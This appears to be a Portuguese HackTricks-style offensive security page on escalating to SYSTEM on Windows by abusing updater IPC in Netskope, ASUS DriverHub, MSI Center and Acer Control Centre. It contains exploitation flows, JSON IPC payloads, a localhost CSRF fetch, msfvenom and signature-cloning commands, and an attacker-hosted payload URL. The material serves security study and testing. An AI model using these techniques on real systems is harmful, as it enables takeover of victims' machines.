# Abusando de Auto\-Atualizadores Empresariais e IPC Privilegiado (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza uma classe de cadeias de elevação de privilégio locais no Windows encontradas em agentes de endpoint empresariais e atualizadores que expõem uma superfície de IPC de baixa\-friction e um fluxo de atualização privilegiado. Um exemplo representativo é o Netskope Client for Windows < R129 (CVE-2025-0309), onde um usuário de baixo\-privilégio pode coagir o registro em um servidor controlado pelo atacante e então entregar um MSI malicioso que o serviço SYSTEM instala.

Ideias principais que você pode reutilizar contra produtos semelhantes:
- Abusar do IPC localhost de um serviço privilegiado para forçar o re\-registro ou reconfiguração para um servidor do atacante.
- Implementar os endpoints de atualização do fornecedor, entregar uma rogue Trusted Root CA, e apontar o updater para um pacote malicioso “assinado”.
- Evadir verificações fracas de signer (CN allow\-lists), flags de digest opcionais, e propriedades MSI laxas.
- Se o IPC estiver “encrypted”, derivar a key/IV de identificadores de máquina world\-readable armazenados no registro.
- Se o serviço restringir chamadores por image path/process name, injetar em um processo allow\-listed ou spawnar um suspenso e bootstrapar sua DLL via um patch mínimo no thread\-context.

---
## 1) Forçando o registro em um servidor do atacante via IPC localhost

Muitos agentes enviam um processo user\-mode UI que conversa com um serviço SYSTEM sobre localhost TCP usando JSON.

Observado no Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Fluxo de exploração:
1) Crie um token JWT de registro cujos claims controlam o backend host (e.g., AddonUrl). Use alg=None para que nenhuma assinatura seja exigida.
2) Envie a mensagem IPC invocando o comando de provisioning com seu JWT e tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) O serviço começa a contactar o seu servidor malicioso para enrollment/config, por exemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name\-based, originate the request from a allow\-listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Uma vez que o client se comunique com o seu server, implemente os endpoints esperados e direcione-o para um MSI do atacante. Sequência típica:

1) /v2/config/org/clientconfig → Retorne uma config JSON com um intervalo do updater muito curto, por exemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retorna um certificado CA PEM. O serviço o instala no Local Machine Trusted Root store.
3) /v2/checkupdate → Fornece metadados apontando para um MSI malicioso e uma versão falsa.

Bypassing common checks seen in the wild:
- Signer CN allow\-list: o serviço pode apenas verificar se o Subject CN é “netSkope Inc” ou “Netskope, Inc.”. Sua CA rogue pode emitir um leaf com esse CN e assinar o MSI.
- CERT_DIGEST property: inclua uma propriedade MSI benigna chamada CERT_DIGEST. Nenhuma aplicação dessa propriedade na instalação.
- Optional digest enforcement: flag de config (por exemplo, check_msi_digest=false) desativa validações criptográficas adicionais.

Resultado: o serviço SYSTEM instala seu MSI de
C:\ProgramData\Netskope\stAgent\data\*.msi
executando código arbitrário como NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

A partir do R127, a Netskope envolveu o JSON de IPC em um campo encryptData que parece Base64. A engenharia reversa mostrou AES com key/IV derivadas de valores do registro legíveis por qualquer usuário:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atacantes podem reproduzir a criptografia e enviar comandos criptografados válidos a partir de um usuário padrão. Dica geral: se um agente subitamente “encrypts” seu IPC, procure por device IDs, product GUIDs, install IDs sob HKLM como material.

---
## 4) Bypassing IPC caller allow\-lists (path/name checks)

Alguns serviços tentam autenticar o peer resolvendo o PID da conexão TCP e comparando o image path/name contra bins do vendor na allow\-list localizados em Program Files (por exemplo, stagentui.exe, bwansvc.exe, epdlp.exe).

Dois bypasses práticos:
- DLL injection em um processo allow\-listed (por exemplo, nsdiag.exe) e proxy do IPC a partir de dentro dele.
- Spawn de um binário allow\-listed em estado suspended e bootstrap da sua proxy DLL sem CreateRemoteThread (veja §5) para satisfazer regras de tamper impostas pelo driver.

---
## 5) Tamper\-protection friendly injection: suspended process + NtContinue patch

Produtos frequentemente distribuem um minifilter/OB callbacks driver (por exemplo, Stadrv) para remover direitos perigosos de handles para processos protegidos:
- Process: remove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe para THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Um loader user\-mode confiável que respeita essas restrições:
1) CreateProcess de um binário do vendor com CREATE_SUSPENDED.
2) Obtenha handles que você ainda tem permissão: PROCESS_VM_WRITE | PROCESS_VM_OPERATION no processo, e um handle de thread com THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou apenas THREAD_RESUME se você patchar código em um RIP conhecido).
3) Sobrescreva ntdll!NtContinue (ou outro thunk inicial garantido mapeado) com um pequeno stub que chama LoadLibraryW no caminho da sua DLL, então retorna.
4) ResumeThread para disparar seu stub in\-process, carregando sua DLL.

Porque você nunca usou PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME em um processo já protegido (você o criou), a política do driver é satisfeita.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza uma rogue CA, assinatura de MSI malicioso, e serve os endpoints necessários: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope é um cliente IPC custom que monta mensagens IPC arbitrárias (opcionalmente AES\-encrypted) e inclui a injeção por processo suspenso para originar de um binário allow\-listed.

---
## 1) Browser\-to\-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub entrega um serviço HTTP user\-mode (ADU.exe) em 127.0.0.1:53000 que espera chamadas do browser vindas de https://driverhub.asus.com. O filtro de Origin simplesmente realiza `string_contains(".asus.com")` sobre o header Origin e sobre URLs de download expostos por `/asus/v1.0/*`. Qualquer host controlado pelo atacante, como `https://driverhub.asus.com.attacker.tld`, portanto passa na verificação e pode emitir requisições que alteram estado a partir de JavaScript. Veja [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para padrões adicionais de bypass.

Fluxo prático:
1) Registre um domínio que incorpore `.asus.com` e hospede uma página maliciosa lá.
2) Use `fetch` ou XHR para chamar um endpoint privilegiado (por exemplo, `Reboot`, `UpdateApp`) em `http://127.0.0.1:53000`.
3) Envie o body JSON esperado pelo handler – o frontend JS empacotado mostra o schema abaixo.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Até mesmo o PowerShell CLI mostrado abaixo funciona quando o Origin header é spoofed para o trusted value:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1\-click (or 0\-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code\-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` faz download de executáveis arbitrários definidos no corpo JSON e os cacheia em `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. A validação da URL de download reutiliza a mesma lógica de substring, então `http://updates.asus.com.attacker.tld:8000/payload.exe` é aceita. Após o download, ADU.exe apenas verifica que o PE contém uma assinatura e que a string Subject corresponde a ASUS antes de executá\-lo – sem `WinVerifyTrust`, sem validação de cadeia.

To weaponize the flow:
1) Crie um payload (por exemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone o assinador da ASUS nele (por exemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hospede `pwn.exe` em um domínio falso semelhante a `.asus.com` e dispare UpdateApp via o CSRF do navegador acima.

Porque tanto os filtros de Origin quanto de URL são baseados em substring e a verificação do assinador apenas compara strings, DriverHub puxa e executa o binário do atacante em seu contexto elevado.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

O serviço SYSTEM do MSI Center expõe um protocolo TCP onde cada frame é `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. O componente central (Component ID `0f 27 00 00`) fornece `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Seu handler:
1) Copia o executável fornecido para `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica a assinatura via `CS_CommonAPI.EX_CA::Verify` (o Subject do certificado deve ser “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve ter sucesso).
3) Cria uma tarefa agendada que executa o arquivo temporário como SYSTEM com argumentos controlados pelo atacante.

O arquivo copiado não fica travado entre a verificação e `ExecuteTask()`. Um atacante pode:
- Enviar o Frame A apontando para um binário legítimo assinado pela MSI (garante que a verificação de assinatura passe e que a tarefa seja enfileirada).
- Competir com mensagens Frame B repetidas que apontam para um payload malicioso, sobrescrevendo `MSI Center SDK.exe` logo após a verificação ser concluída.

Quando o agendador dispara, ele executa o payload sobrescrito como SYSTEM apesar de ter validado o arquivo original. Exploração confiável usa duas goroutines/threads que disparam `CMD_AutoUpdateSDK` até que a janela TOCTOU seja vencida.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Cada plugin/DLL carregado por `MSI.CentralServer.exe` recebe um Component ID armazenado em `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Os primeiros 4 bytes de um frame selecionam esse componente, permitindo que atacantes direcionem comandos para módulos arbitrários.
- Plugins podem definir seus próprios task runners. `Support\API_Support.dll` expõe `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chama diretamente `API_Support.EX_Task::ExecuteTask()` com **no signature validation** – qualquer usuário local pode apontá\-lo para `C:\Users\<user>\Desktop\payload.exe` e obter execução como SYSTEM de forma determinística.
- Fazer sniff no loopback com Wireshark ou instrumentar os binários .NET no dnSpy revela rapidamente o mapeamento Component ↔ command; clientes customizados em Go/ Python podem então reproduzir os frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expõe `\\.\pipe\treadstone_service_LightMode`, e seu discretionary ACL permite clientes remotos (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Enviar o command ID `7` com um caminho de arquivo invoca a rotina de spawn de processo do serviço.
- A biblioteca cliente serializa um byte terminador mágico (113) junto com os args. Instrumentação dinâmica com Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) mostra que o handler nativo mapeia esse valor para um `SECURITY_IMPERSONATION_LEVEL` e integrity SID antes de chamar `CreateProcessAsUser`.
- Trocar 113 (`0x71`) por 114 (`0x72`) entra no ramo genérico que mantém o token SYSTEM completo e define um integrity SID de alta integridade (`S-1-16-12288`). O binário spawnado, portanto, executa como SYSTEM sem restrições, tanto localmente quanto entre máquinas.
- Combine isso com a flag do instalador exposta (`Setup.exe -nocheck`) para levantar o ACC mesmo em VMs de laboratório e exercitar o pipe sem hardware do fornecedor.

Esses bugs de IPC destacam por que serviços localhost devem impor autenticação mútua (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) e por que o helper “run arbitrary binary” de cada módulo deve compartilhar as mesmas verificações de assinador.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)

{{#include ../../banners/hacktricks-training.md}}
